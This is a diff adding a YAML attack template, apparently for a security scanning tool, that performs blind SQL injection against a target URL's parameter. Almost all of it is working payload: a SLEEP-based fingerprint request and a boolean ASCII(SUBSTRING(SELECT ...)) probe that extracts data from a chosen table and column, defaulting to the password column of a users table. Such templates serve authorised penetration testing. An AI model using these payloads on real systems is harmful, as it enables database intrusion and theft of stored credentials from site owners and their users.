@@ -1,0 +1,41 @@
+id: blind-sqli-extract
+name: Blind SQL Injection Data Extraction
+severity: critical
+tags: [sqli, injection, data-extraction, blind, wstg-inpv-05, cwe-89]
+inputs:
+  target_url:
+    type: string
+    required: true
+  param:
+    type: string
+    default: q
+  table:
+    type: string
+    default: users
+  column:
+    type: string
+    default: password
+steps:
+  - name: fingerprint
+    request:
+      method: GET
+      url: "{{ inputs.target_url }}"
+      params:
+        "{{ inputs.param }}": "1' AND SLEEP(0)-- -"
+  - name: baseline
+    request:
+      method: GET
+      url: "{{ inputs.target_url }}"
+      params:
+        "{{ inputs.param }}": "1"
+  - name: extract
+    request:
+      method: GET
+      url: "{{ inputs.target_url }}"
+      params:
+        "{{ inputs.param }}": "1' AND ASCII(SUBSTRING((SELECT {{ inputs.column }} FROM {{ inputs.table }} LIMIT 1),1,1))>64-- -"
+oracles:
+  - type: blind_sqli_extract
+    table: "{{ inputs.table }}"
+    column: "{{ inputs.column }}"
+    verdict: VULNERABLE
